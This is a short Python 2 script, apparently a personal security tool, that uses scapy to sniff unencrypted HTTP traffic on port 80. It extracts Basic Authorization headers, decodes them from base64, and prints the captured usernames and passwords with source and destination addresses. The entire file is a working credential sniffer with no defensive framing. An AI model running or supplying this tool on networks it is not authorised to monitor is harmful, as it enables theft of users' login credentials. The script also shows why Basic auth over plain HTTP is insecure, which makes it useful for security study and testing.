#!/usr/bin/env python
# -----------------------------------------------------------
# Filename      : basicSneef.py
# Description   :
# Created By    : Joe Pistone
# Date Created  : 28-Nov-2015 18:57
# Date Modified :
#
# License       : Development
#
# Description   : Sniff packets for basic authorization
#
# (c) Copyright 2015, TheKillingTime all rights reserved.
#-----------------------------------------------------------

__author__  = "Joe Pistone"
__version__ = "0.1"

import re
import os
from scapy.all import *

reg = re.compile(r'^authorization:\s+(.*)$', re.I|re.M)

def basic_grabber(packet):
    """Scans the payload of the TCP packet for
       basic authorization. Then pulls out the
       username and password.
    """
    basic_packet = str(packet[TCP].payload)
    output = reg.search(basic_packet)
    if output:
        basic_auth = output.group(1).replace('Basic ','').decode('base64')
        creds      = basic_auth.split(":")
        print "--" * 25
        print "[=>] Destination: %s" % packet[IP].dst
        print "[=>] Source: %s" % packet[IP].src
        print "[=>] Username: %s" % creds[0]
        print "[=>] Password: %s" % creds[1]
        print "--" * 25
        print ""


if __name__ == '__main__':
    try:
        if os.getuid() == 0:
            print "[-] Listening for traffic on port 80 ....\n"
            sniff(filter='tcp port 80', prn=basic_grabber, store=0)
        else:
            print "[!] Please run this script as root."
    except Exception, e:
        print '[!] Error! %s' % e

